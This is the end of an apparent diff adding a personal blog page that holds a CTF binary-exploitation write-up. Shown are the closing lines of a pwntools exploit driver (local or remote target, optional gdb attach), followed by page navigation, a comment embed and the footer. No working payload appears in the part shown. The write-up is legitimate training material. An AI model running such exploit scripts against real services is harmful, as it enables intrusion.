+    p <span style="color:#f92672">=</span> process(BINARY)
+
+    <span style="color:#66d9ef">if</span> len(argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;d&#39;</span>:
+            p <span style="color:#f92672">=</span> remote(HOST, PORT)
+        <span style="color:#66d9ef">else</span>:
+            cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">            &#39;&#39;&#39;</span>
+            gdb<span style="color:#f92672">.</span>attach(p, cmd)
+    exploit()
+</code></pre></div><p><img src="https://fikriguska.github.io/img/sum-3.png" alt="image alt text"></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://fikriguska.github.io/tags/ctf">ctf</a></span><span class="tag"><a href="https://fikriguska.github.io/tags/binary-exploitation">binary exploitation</a></span><span class="tag"><a href="https://fikriguska.github.io/tags/hacktoday">hacktoday</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>820 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-08-11 21:43 &#43;0700</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-no-free/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">Hacktoday 2020 (Quals) - no free</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://fikriguska.github.io/posts/2020/03/unity-2020-babystack/">
+                                <span class="button__text">UNITY 2020 - Babystack</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+            <div id="comments" class="thin">
+                <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "fikriguska" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>2020</span>
+	    <span>Indonesia</span>
+            
+                <span><a href="https://fikriguska.github.io">Bintang Fikriguska</a></span>
+            
+            
+            <span> <a href="https://fikriguska.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://fikriguska.github.io/bundle.min.71be052e49740d65a77749a66c7e41b2f934c67fe08f37bf036d77cf7c34c90c83122f356c5fe8502d77a613eae1e3d900920dea1b5503167036da04f2798f19.js" integrity="sha512-cb4FLkl0DWWnd0mmbH5Bsvk0xn/gjze/A213z3w0yQyDEi81bF/oUC13phPq4ePZAJIN6htVAxZwNtoE8nmPGQ=="></script>
+
+
+
+    </body>
+</html>
